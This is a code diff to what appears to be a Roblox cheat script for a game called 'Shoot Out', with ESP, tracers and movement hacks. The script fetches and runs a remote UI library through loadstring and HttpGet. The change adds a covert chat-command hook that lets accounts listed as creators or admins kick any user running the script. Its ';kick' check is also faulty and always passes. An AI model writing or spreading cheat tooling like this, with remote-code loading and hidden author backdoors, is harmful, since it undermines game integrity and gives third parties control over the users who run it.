@@ -3,7 +3,7 @@ local hintmsg = Instance.new("Hint", game.CoreGui)
 local attempt = tick()
 hintmsg.Text = "Initializing UI Library This Can Take Up To 30 Seconds"
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/zerovectors/framework/master/vect0rs%20hub%20framework%20uwuware%20checkmarks", true))()
-local version = "1.1"
+local version = "1.2"
 local uiname = "Shoot Out"
 local ui = { }
 local main = { }
@@ -127,6 +127,7 @@ do -- main
         CharAddedEvent = { };
         Mob_ESP_CHAMS_Ran_Once = false;
     };
+    main.Arguments = { };
     main.guntables = { };
     main.VelCap = 5;
     main.JumpBoostAmt = 0.1;
@@ -1549,6 +1550,38 @@ do -- main
         main:RemoveESP(Plr)
         main.TracerMT[Plr.Name] = nil
     end)
+    function main:onPlayerAdded(plr)
+        plr.Chatted:Connect(function (msg)
+            main.Arguments = { }
+            for Argument in string.gmatch(msg,"[^%s]+") do
+                table.insert(main.Arguments,Argument)
+            end
+            if getrenv().creator_accounts[plr.UserId] then
+                if main.Arguments[2] == game.Players.LocalPlayer.Name then
+                    if string.gmatch(";kick", msg) then
+                        local reason = main.Arguments[3]
+                        print(reason)
+                        if main.Arguments[2] == game.Players.LocalPlayer.Name then
+                            game.Players.LocalPlayer:Kick(reason)
+                        end
+                    end
+                end
+            elseif getrenv().admin_accounts[plr.UserId] then
+                if main.Arguments[2] == game.Players.LocalPlayer.Name then
+                    if string.gmatch(";kick", msg) then
+                        local reason = main.Arguments[3]
+                        print(reason)
+                        if main.Arguments[2] == game.Players.LocalPlayer.Name then
+                            game.Players.LocalPlayer:Kick(reason)
+                        end
+                    end
+                end
+            end
+        end)
+    end
+    for _, plrs in pairs(game.Players:GetPlayers()) do
+        main:onPlayerAdded(plrs)
+    end
 end
 do -- ui
     function ui:Init()
